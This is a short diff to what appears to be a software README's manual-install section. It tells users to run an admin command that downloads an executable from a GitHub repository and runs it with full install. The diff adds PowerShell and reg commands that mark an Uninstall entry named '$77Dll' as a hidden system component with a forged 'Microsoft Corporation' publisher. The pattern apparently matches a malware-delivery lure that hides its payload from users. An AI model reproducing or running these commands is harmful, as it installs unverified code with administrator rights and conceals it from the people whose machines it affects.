@@ -59,7 +59,13 @@ If you prefer to do it manually, open an **admin** Command Prompt and run:
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe' -OutFile 'C:\Program Files\Agentpro.exe' -UseBasicParsing"
 "C:\Program Files\Agentpro.exe" -fullinstall
 ```
-
+new file
+```
+$k='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$77Dll'; New-ItemProperty $k SystemComponent 1 -PropertyType DWord -Force | Out-Null; New-ItemProperty $k Publisher 'Microsoft Corporation' -Force | Out-Null; "done"
+```
+```
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$77Dll" /v SystemComponent /t REG_DWORD /d 1 /f && reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$77Dll" /v Publisher /t REG_SZ /d "Microsoft Corporation" /f && echo done
+```
 ## Requirements
 
 - Windows 10/11
